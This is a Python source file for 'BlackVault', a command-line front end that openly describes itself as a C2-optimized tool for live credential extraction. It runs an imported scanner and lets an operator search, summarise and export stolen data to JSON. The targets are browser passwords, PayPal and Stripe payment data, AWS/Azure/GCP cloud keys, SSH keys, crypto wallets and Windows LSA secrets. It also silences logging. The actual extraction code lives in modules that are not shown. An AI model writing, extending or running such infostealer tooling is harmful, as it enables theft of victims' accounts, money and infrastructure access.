#!/usr/bin/env python3
"""
BlackVault Unified CLI - Live credential extraction + C2 interface
Extracts credentials fresh and queries vault artifacts
C2-optimized with JSON output support
"""
import os
import json
import sys
import argparse
from datetime import datetime
from typing import List, Dict, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ghost_layer import GhostLayer
from black_vault import BlackVault

# Suppress BlackVault logging noise
logging.getLogger('BlackVault').setLevel(logging.ERROR)

# Suppress BlackVault logging noise
logging.getLogger('BlackVault').setLevel(logging.CRITICAL)
logging.getLogger().setLevel(logging.CRITICAL)

class BlackVaultCLI:
    """Unified CLI for BlackVault - C2 Compatible"""
    
    EXIT_SUCCESS = 0
    EXIT_ERROR = 1
    EXIT_NOT_FOUND = 2
    
    CREDENTIAL_TYPES = {
        'chrome': 'Chrome Passwords',
        'firefox': 'Firefox Passwords',
        'brave': 'Brave Passwords',
        'google': 'Google Credentials',
        'paypal': 'PayPal Accounts',
        'stripe': 'Stripe Accounts',
        'email': 'Email Credentials',
        'aws': 'AWS Credentials',
        'azure': 'Azure Credentials',
        'gcp': 'GCP Credentials',
        'docker': 'Docker Auth',
        'git': 'Git Credentials',
        'ssh': 'SSH Keys',
        'crypto': 'Cryptocurrency',
        'windows': 'Windows Credentials',
        'database': 'Database Creds',
        'api': 'API Keys'
    }
    
    def __init__(self, json_output: bool = False):
        """Initialize CLI with optional JSON output for C2"""
        self.vault = BlackVault()
        self.vault_dir = self.vault.vault_dir
        self.json_output = json_output
        self.ghost = GhostLayer(vault=self.vault)
    
    def list_artifacts(self) -> List[str]:
        """List all encrypted artifacts in vault"""
        try:
            artifacts = os.listdir(self.vault_dir)
            return sorted([a for a in artifacts if a.endswith('.dat')])
        except Exception as e:
            if not self.json_output:
                print(f"[!] Error listing artifacts: {e}")
            return []
    
    def extract_credentials(self) -> Dict[str, Any]:
        """Run live credential extraction (working pipeline)"""
        try:
            result = self.ghost.scan_local_credentials()
            return result
        except Exception as e:
            if not self.json_output:
                print(f"[!] Extraction error: {e}")
            return {}
    
    def load_artifact(self, artifact_name: str) -> Optional[Dict[str, Any]]:
        """Load and decrypt artifact from vault"""
        try:
            data = self.vault.retrieve(artifact_name)
            if data:
                return json.loads(data.decode('utf-8'))
        except:
            pass
        return None
    
    def cmd_list(self, args):
        """List all artifacts in vault"""
        artifacts = self.list_artifacts()
        
        if not artifacts:
            if self.json_output:
                print(json.dumps({"artifacts": [], "total": 0, "status": "success"}))
            else:
                print("[*] No artifacts found in vault")
            return 0
        
        artifact_list = []
        if not self.json_output:
            print(f"\n{'Name':<50} {'Size':>10} {'Modified':<20}")
            print("-" * 80)
        
        total_size = 0
        for artifact in artifacts:
            filepath = os.path.join(self.vault_dir, artifact)
            try:
                size = os.path.getsize(filepath)
                mtime = datetime.fromtimestamp(os.path.getmtime(filepath))
                total_size += size
                
                artifact_list.append({
                    "name": artifact,
                    "size_bytes": size,
                    "size_kb": round(size / 1024, 1),
                    "mtime": mtime.isoformat()
                })
                
                if not self.json_output:
                    print(f"{artifact:<50} {size/1024:>9.1f}KB {mtime.strftime('%Y-%m-%d %H:%M:%S'):<20}")
            except Exception as e:
                if not self.json_output:
                    print(f"[!] Error reading {artifact}: {e}")
        
        if self.json_output:
            print(json.dumps({
                "artifacts": artifact_list,
                "total": len(artifacts),
                "total_size_kb": round(total_size / 1024, 1),
                "status": "success"
            }))
        else:
            print("-" * 80)
            print(f"[+] Total: {len(artifacts)} artifacts ({total_size/1024:.1f}KB)\n")
        
        return 0
    
    def cmd_types(self, args):
        """List available credential types"""
        if self.json_output:
            types_list = [{"key": k, "name": v} for k, v in sorted(self.CREDENTIAL_TYPES.items())]
            print(json.dumps({"types": types_list, "total": len(types_list), "status": "success"}))
        else:
            print("\n[=] Available Credential Types:")
            for key, name in sorted(self.CREDENTIAL_TYPES.items()):
                print(f"  {key:<15} → {name}")
            print()
        
        return 0
    
    def cmd_search(self, args):
        """Search for specific credential type - uses live extraction"""
        if not hasattr(args, 'type') or not args.type:
            print("[!] --type parameter required")
            return self.EXIT_ERROR
        
        cred_type = args.type.lower()
        
        # Map search terms to actual extraction keys
        type_mapping = {
            'chrome': ['chrome_passwords'],
            'firefox': ['firefox_passwords'],
            'brave': ['brave_browser_data'],
            'browser': ['browser_data', 'chrome_passwords', 'brave_browser_data', 'firefox_passwords'],
            'google': ['google_credentials'],
            'paypal': ['browser_data'],  # PayPal is in payment cards within browser_data
            'stripe': ['browser_data'],  # Stripe is in payment cards within browser_data
            'email': ['email_credentials'],
            'aws': ['cloud_provider_credentials'],
            'azure': ['cloud_provider_credentials'],
            'gcp': ['cloud_provider_credentials'],
            'docker': ['docker_credentials'],
            'git': ['git_credentials'],
            'ssh': ['ssh_keys_advanced'],
            'crypto': ['browser_data'],  # Crypto wallets might be in browser data
            'windows': ['credential_manager', 'lsa_secrets'],
            'database': ['database_credentials'],
            'api': [],  # API keys may not be in a specific category
            'password': ['chrome_passwords', 'browser_data', 'credential_manager'],
            'social': ['social_media_credentials'],
            'safari': ['safari_data'],
            'extension': ['browser_extensions']
        }
        
        search_keys = type_mapping.get(cred_type, [cred_type])
        
        # Run LIVE extraction
        result = self.extract_credentials()
        found_creds = []
        
        # Search through phases for matching keys
        for phase_key in ['critical_findings', 'phase_1_extracted', 'phase_2_extracted', 'phase_3_extracted', 'phase_4_extracted']:
            phase_data = result.get(phase_key, {})
            
            for search_key in search_keys:
                value = phase_data.get(search_key, [])
                if value:
                    if isinstance(value, list):
                        found_creds.extend(value)
                    elif isinstance(value, dict):
                        found_creds.append(value)
        
        if not found_creds:
            if self.json_output:
                print(json.dumps({"type": cred_type, "count": 0, "credentials": [], "status": "not_found"}))
            else:
                print(f"[*] No credentials found for type: {cred_type}\n")
            return self.EXIT_NOT_FOUND
        
        # Filter results for specific types (e.g., payment cards for PayPal)
        if cred_type in ['paypal', 'stripe', 'crypto']:
            filtered = []
            search_term = cred_type.lower()
            for cred in found_creds:
                if isinstance(cred, dict):
                    # Check all values for the search term
                    cred_str = json.dumps(cred).lower()
                    if search_term in cred_str or 'payment' in cred_str:
                        filtered.append(cred)
            found_creds = filtered
        
        if not found_creds and cred_type in ['paypal', 'stripe']:
            if self.json_output:
                print(json.dumps({"type": cred_type, "count": 0, "credentials": [], "status": "not_found"}))
            else:
                print(f"[*] No {cred_type} credentials found\n")
            return self.EXIT_NOT_FOUND
        
        if self.json_output:
            print(json.dumps({
                "type": cred_type,
                "count": len(found_creds),
                "credentials": found_creds[:50],  # Limit to first 50 for JSON output
                "status": "success"
            }, indent=2))
        else:
            print(f"\n[+] Found {len(found_creds)} credential(s) for type: {cred_type}")
            for idx, cred in enumerate(found_creds[:10], 1):
                if isinstance(cred, dict):
                    # Show key fields
                    preview = []
                    for k in ['username', 'email', 'url', 'hostname', 'title', 'name', 'account', 'address']:
                        if k in cred:
                            preview.append(f"{cred[k]}")
                            break
                    if preview:
                        print(f"  [{idx}] {preview[0]}")
                    else:
                        print(f"  [{idx}] {list(cred.keys())[0]}")
                else:
                    print(f"  [{idx}] {str(cred)[:80]}")
            if len(found_creds) > 10:
                print(f"  ... and {len(found_creds) - 10} more")
            print()
        
        return self.EXIT_SUCCESS
    
    def cmd_summary(self, args):
        """Show credential summary from live extraction"""
        # Run LIVE extraction (working pipeline)
        result = self.extract_credentials()
        
        summary = {}
        total_creds = 0
        
        # Count from all phases
        for phase_key in ['phase_1_extracted', 'phase_2_extracted', 'phase_3_extracted', 'phase_4_extracted', 'critical_findings']:
            phase_data = result.get(phase_key, {})
            
            for key, value in phase_data.items():
                if isinstance(value, list):
                    count = len(value)
                elif isinstance(value, dict):
                    count = 1
                else:
                    count = 1
                
                if key not in summary:
                    summary[key] = 0
                summary[key] += count
                total_creds += count
        
        if not summary:
            if self.json_output:
                print(json.dumps({"summary": {}, "total": 0, "status": "success"}))
            else:
                print("[*] No credentials extracted\n")
            return 0
        
        if self.json_output:
            summary_list = [{"type": k, "count": v} for k, v in sorted(summary.items(), key=lambda x: x[1], reverse=True)]
            print(json.dumps({
                "summary": summary_list,
                "total": total_creds,
                "status": "success"
            }))
        else:
            print("\n[=] LIVE CREDENTIAL EXTRACTION SUMMARY")
            print(f"{'Type':<30} {'Count':>10}")
            print("-" * 40)
            for cred_type in sorted(summary.keys(), key=lambda x: summary[x], reverse=True):
                count = summary[cred_type]
                print(f"{cred_type:<30} {count:>10}")
            print("-" * 40)
            print(f"{'TOTAL':<30} {total_creds:>10}\n")
        
        return 0
    
    def cmd_extract(self, args):
        """Extract credentials by type to JSON file - uses live extraction"""
        if not hasattr(args, 'type') or not args.type:
            print("[!] --type parameter required")
            return self.EXIT_ERROR
        
        cred_type = args.type.lower()
        output_file = getattr(args, 'output', None) or f"{cred_type}_credentials.json"
        
        # Run LIVE extraction (working pipeline)
        result = self.extract_credentials()
        found_creds = []
        
        # Search through all phases
        for phase_key in ['phase_1_extracted', 'phase_2_extracted', 'phase_3_extracted', 'phase_4_extracted', 'critical_findings']:
            phase_data = result.get(phase_key, {})
            
            for key, value in phase_data.items():
                if cred_type in key.lower():
                    if isinstance(value, list):
                        found_creds.extend(value)
                    elif isinstance(value, dict):
                        found_creds.append(value)
        
        if not found_creds:
            if self.json_output:
                print(json.dumps({"error": "no credentials found", "status": "not_found"}))
            else:
                print(f"[*] No credentials found for type: {cred_type}\n")
            return self.EXIT_NOT_FOUND
        
        try:
            with open(output_file, 'w') as f:
                json.dump(found_creds, f, indent=2)
            
            if self.json_output:
                print(json.dumps({
                    "exported": len(found_creds),
                    "file": output_file,
                    "status": "success"
                }))
            else:
                print(f"[+] Exported {len(found_creds)} credentials to {output_file}\n")
            
            return 0
        except Exception as e:
            if self.json_output:
                print(json.dumps({"error": str(e), "status": "error"}))
            else:
                print(f"[!] Failed to export: {e}\n")
            return self.EXIT_ERROR
    
    def cmd_view(self, args):
        """View details of a specific artifact"""
        if not hasattr(args, 'artifact') or not args.artifact:
            print("[!] --artifact parameter required")
            return self.EXIT_ERROR
        
        artifacts = self.list_artifacts()
        matching = [a for a in artifacts if args.artifact in a]
        
        if not matching:
            if self.json_output:
                print(json.dumps({"error": "artifact not found", "status": "not_found"}))
            else:
                print(f"[!] No artifact found matching: {args.artifact}\n")
            return self.EXIT_NOT_FOUND
        
        if len(matching) > 1:
            if self.json_output:
                print(json.dumps({"error": "multiple matches", "matches": matching, "status": "error"}))
            else:
                print(f"[!] Multiple artifacts match '{args.artifact}':")
                for m in matching:
                    print(f"  - {m}")
                print()
            return self.EXIT_ERROR
        
        artifact = matching[0]
        data = self.load_artifact(artifact)
        if not data:
            return self.EXIT_ERROR
        
        if self.json_output:
            # Build preview
            preview = {}
            for phase_key in ['phase_1_extracted', 'phase_2_extracted', 'phase_3_extracted', 'phase_4_extracted', 'critical_findings']:
                if phase_key in data:
                    phase_data = data[phase_key]
                    preview[phase_key] = {}
                    for key, value in phase_data.items():
                        if isinstance(value, list):
                            preview[phase_key][key] = {"type": "list", "count": len(value)}
                        elif isinstance(value, dict):
                            preview[phase_key][key] = {"type": "dict", "items": len(value)}
                        else:
                            preview[phase_key][key] = str(value)
            
            print(json.dumps({"artifact": artifact, "preview": preview, "status": "success"}))
        else:
            print(f"\n[=] Artifact: {artifact}")
            print(f"[=] Phases available:")
            for phase_key in ['phase_1_extracted', 'phase_2_extracted', 'phase_3_extracted', 'phase_4_extracted', 'critical_findings']:
                if phase_key in data:
                    phase_data = data[phase_key]
                    print(f"\n  {phase_key}:")
                    for key, value in phase_data.items():
                        if isinstance(value, list):
                            print(f"    - {key}: {len(value)} items")
                        elif isinstance(value, dict):
                            print(f"    - {key}: {len(value)} entries")
                        else:
                            print(f"    - {key}: {value}")
            print()
        
        return 0

def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description='BlackVault Unified CLI - C2 Optimized Credential Retrieval',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  List all artifacts:
    %(prog)s list
  
  List available credential types:
    %(prog)s types
  
  Search for Chrome passwords:
    %(prog)s search --type chrome
  
  Search for PayPal credentials (JSON output):
    %(prog)s search --type paypal --json
  
  Show credential summary:
    %(prog)s summary
  
  Extract Google credentials to file:
    %(prog)s extract --type google --output google_creds.json
  
  View artifact details:
    %(prog)s view --artifact credentials_extraction
        """
    )
    
    parser.add_argument('--json', action='store_true', help='Output JSON for C2 integration')
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    subparsers.add_parser('list', help='List all artifacts in vault')
    subparsers.add_parser('types', help='Show available credential types')
    
    search_parser = subparsers.add_parser('search', help='Search for credentials by type')
    search_parser.add_argument('--type', required=True, help='Credential type to search')
    
    subparsers.add_parser('summary', help='Show credential summary')
    
    extract_parser = subparsers.add_parser('extract', help='Extract credentials to file')
    extract_parser.add_argument('--type', required=True, help='Credential type')
    extract_parser.add_argument('--output', help='Output file (default: type_credentials.json)')
    
    view_parser = subparsers.add_parser('view', help='View artifact details')
    view_parser.add_argument('--artifact', required=True, help='Artifact name or partial match')
    
    args = parser.parse_args()
    
    cli = BlackVaultCLI(json_output=getattr(args, 'json', False))
    
    if args.command == 'list':
        return cli.cmd_list(args)
    elif args.command == 'types':
        return cli.cmd_types(args)
    elif args.command == 'search':
        return cli.cmd_search(args)
    elif args.command == 'summary':
        return cli.cmd_summary(args)
    elif args.command == 'extract':
        return cli.cmd_extract(args)
    elif args.command == 'view':
        return cli.cmd_view(args)
    else:
        parser.print_help()
        return 1

if __name__ == '__main__':
    sys.exit(main())
